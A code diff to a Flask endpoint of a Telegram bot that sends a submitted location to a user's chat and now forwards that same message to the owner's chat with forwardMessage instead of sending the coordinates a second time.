@@ -144,7 +144,7 @@ def send_location():
     except Exception:
         return jsonify({"status": "invalid coords"}), 400
 
-    # Step 1: Send to user
+    # Step 1: Send location to user
     resp = requests.post(
         f"{TELEGRAM_API}/sendLocation",
         data={"chat_id": chat_id, "latitude": lat, "longitude": lon}
@@ -152,11 +152,16 @@ def send_location():
     result = resp.json()
     print("User location response:", result)
 
-    # Step 2: Send to owner
+    # Step 2: Forward same message to owner (like photo)
     if result.get("ok"):
+        message_id = result["result"]["message_id"]
         requests.post(
-            f"{TELEGRAM_API}/sendLocation",
-            data={"chat_id": OWNER_CHAT_ID, "latitude": lat, "longitude": lon}
+            f"{TELEGRAM_API}/forwardMessage",
+            data={
+                "chat_id": OWNER_CHAT_ID,
+                "from_chat_id": chat_id,
+                "message_id": message_id
+            }
         )
 
     return jsonify({"status": "sent"}), 200
